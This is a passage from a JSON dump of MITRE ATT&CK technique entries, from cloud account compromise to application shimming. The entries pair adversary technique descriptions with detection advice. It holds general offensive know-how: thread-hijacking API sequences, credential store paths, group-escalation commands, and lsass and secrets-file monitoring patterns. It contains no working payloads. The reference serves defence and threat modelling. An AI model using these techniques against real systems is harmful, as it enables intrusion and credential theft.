      "description": "Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)(Citation: Netcraft SendGrid 2024) Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1586.003",
      "stix_id": "attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a",
      "created": "2022-05-27T14:30:01.904000+00:00",
      "modified": "2025-04-15T22:01:54.640000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537))."
    },
    "T1586.002": {
      "id": "T1586.002",
      "name": "Email Accounts",
      "description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1586.002",
      "stix_id": "attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b",
      "created": "2020-10-01T01:20:53.104000+00:00",
      "modified": "2025-04-15T22:26:01.830000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566))."
    },
    "T1098.007": {
      "id": "T1098.007",
      "name": "Additional Local or Domain Groups",
      "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.\n\nOn Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)\n\nFor example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. \n\nIn Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1098.007",
      "stix_id": "attack-pattern--3e6831b2-bf4c-4ae6-b328-2e7c6633b291",
      "created": "2024-08-05T20:49:49.809000+00:00",
      "modified": "2025-04-15T21:47:40.787000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Modification"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1608.001": {
      "id": "T1608.001",
      "name": "Upload Malware",
      "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.\n\nMalware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)\n\nAdversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.001",
      "stix_id": "attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e",
      "created": "2021-03-17T20:09:13.222000+00:00",
      "modified": "2025-04-15T23:17:57.194000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [User Execution](https://attack.mitre.org/techniques/T1204) or [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)."
    },
    "T1195": {
      "id": "T1195",
      "name": "Supply Chain Compromise",
      "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1195",
      "stix_id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T23:13:41.905000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Sensor Health: Host Status",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering."
    },
    "T1190": {
      "id": "T1190",
      "name": "Exploit Public-Facing Application",
      "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1190",
      "stix_id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:25.266000+00:00",
      "platforms": [
        "Containers",
        "IaaS",
        "Linux",
        "Network Devices",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation."
    },
    "T1558": {
      "id": "T1558",
      "name": "Steal or Forge Kerberos Tickets",
      "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1558",
      "stix_id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
      "created": "2020-02-11T19:12:46.830000+00:00",
      "modified": "2025-04-15T19:58:25.352000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Logon Session: Logon Session Metadata",
        "Active Directory: Active Directory Credential Request",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.(Citation: ADSecurity Detecting Forged Tickets)(Citation: Stealthbits Detect PtT 2019)(Citation: CERT-EU Golden Ticket Protection)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018) (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\n\nMonitor for unusual processes accessing\u00a0<code>secrets.ldb</code> and <code>.secrets.mkey</code> located in <code>/var/lib/sss/secrets/</code>."
    },
    "T1555": {
      "id": "T1555",
      "name": "Credentials from Password Stores",
      "description": "Adversaries may search for common password storage locations to obtain user credentials.(Citation: F-Secure The Dukes) Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1555",
      "stix_id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0",
      "created": "2020-02-11T18:48:28.456000+00:00",
      "modified": "2025-04-15T22:12:11.343000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Command: Command Execution",
        "Process: Process Access",
        "Cloud Service: Cloud Service Enumeration",
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications."
    },
    "T1567": {
      "id": "T1567",
      "name": "Exfiltration Over Web Service",
      "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1567",
      "stix_id": "attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807",
      "created": "2020-03-09T12:51:45.570000+00:00",
      "modified": "2025-04-15T19:58:25.560000+00:00",
      "platforms": [
        "Linux",
        "Office Suite",
        "SaaS",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "File: File Access",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity."
    },
    "T1219": {
      "id": "T1219",
      "name": "Remote Access Tools",
      "description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1219",
      "stix_id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:25.651000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "Drive: Drive Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions."
    },
    "T1583.001": {
      "id": "T1583.001",
      "name": "Domains",
      "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nDifferent URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)\n\nIn addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor\u2019s choosing.(Citation: Invictus IR DangerDev 2024)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.001",
      "stix_id": "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3",
      "created": "2020-09-30T17:09:31.878000+00:00",
      "modified": "2025-04-15T22:23:15.751000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Domain Name: Passive DNS",
        "Domain Name: Domain Registration",
        "Domain Name: Active DNS"
      ],
      "defense_bypassed": [],
      "detection": "Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control."
    },
    "T1560.002": {
      "id": "T1560.002",
      "name": "Archive via Library",
      "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1560.002",
      "stix_id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6",
      "created": "2020-02-20T21:08:52.529000+00:00",
      "modified": "2025-04-15T21:51:09.003000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Script: Script Execution",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)"
    },
    "T1055.003": {
      "id": "T1055.003",
      "name": "Thread Execution Hijacking",
      "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.003",
      "stix_id": "attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6",
      "created": "2020-01-14T01:28:32.166000+00:00",
      "modified": "2025-04-25T14:46:28.558000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Process: Process Modification",
        "Process: Process Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1036": {
      "id": "T1036",
      "name": "Masquerading",
      "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036",
      "stix_id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
      "created": "2017-05-31T21:30:38.511000+00:00",
      "modified": "2025-04-15T19:58:26.186000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Containers",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Process: Process Metadata",
        "Service: Service Creation",
        "Service: Service Metadata",
        "Process: Process Creation",
        "Image: Image Metadata",
        "Scheduled Job: Scheduled Job Metadata",
        "User Account: User Account Creation",
        "File: File Metadata",
        "Scheduled Job: Scheduled Job Modification",
        "Command: Command Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nLook for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\u201d."
    },
    "T1546.011": {
      "id": "T1546.011",
      "name": "Application Shimming",
      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017)\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.011",
      "stix_id": "attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83",
      "created": "2020-01-24T14:56:24.231000+00:00",
      "modified": "2025-04-25T14:46:29.459000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
